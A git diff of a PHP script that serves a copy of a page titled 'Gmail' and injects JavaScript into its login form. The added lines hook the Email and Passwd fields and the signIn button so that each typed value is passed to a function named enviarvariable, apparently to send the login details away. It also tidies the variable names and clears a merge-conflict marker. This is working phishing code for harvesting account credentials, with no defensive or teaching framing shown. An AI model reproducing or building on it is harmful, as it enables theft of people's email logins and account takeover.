@@ -37,28 +37,21 @@ function handler() {
   }
 }
 
-//enviarvariable('hola'); // llamo a la función pasándole como parámetro el valor de la variable que quieres enviar.
-
-function datos(){
-	name = document.getElementById('Email').value;
-	passw = document.getElementById('Passwd').value;
-	enviarvariable(passw);
-}
-
 </script></head>";
 $htmlConstruida = str_replace("</head>", $insertCode, $html);
 
-$insertCode2 = "id='Email' onchange='enviarvariable(document.getElementById(\"Email\").value)'";
-//$insertCode2 = "id='signIn' onclick='datos();'";
-$htmlConstruidaEmail = str_replace('id="Email"', $insertCode2, $htmlConstruida);
+$insertCode = "id='Email' onchange='enviarvariable(document.getElementById(\"Email\").value)'";
+$htmlConstruida = str_replace('id="Email"', $insertCode, $htmlConstruida);
 
-$insertCode3 = "id='Passwd' onchange='enviarvariable(document.getElementById(\"Passwd\").value)'";
+$insertCode = "id='Passwd' onchange='enviarvariable(document.getElementById(\"Passwd\").value)'";
+$htmlConstruida = str_replace('id="Passwd"', $insertCode, $htmlConstruida);
 
-$htmlConstruidaPasswd = str_replace('id="Passwd"', $insertCode3, $htmlConstruidaEmail);
-echo $htmlConstruidaPasswd;
+$insertCode = "id='signIn' onclick='enviarvariable(document.getElementById(\"Passwd\").value)'";
+$htmlConstruida = str_replace('id="signIn"', $insertCode, $htmlConstruida);
+
+echo $htmlConstruida;
 ?>
 
-=======
 <html>
 <head><title> Gmail </title></head>
 <body>
@@ -70,4 +63,4 @@ echo $html;
 
 </body>
 </html>
->>>>>>> 7bb8788969cfb33b5e3797302d04078c479d369d
+
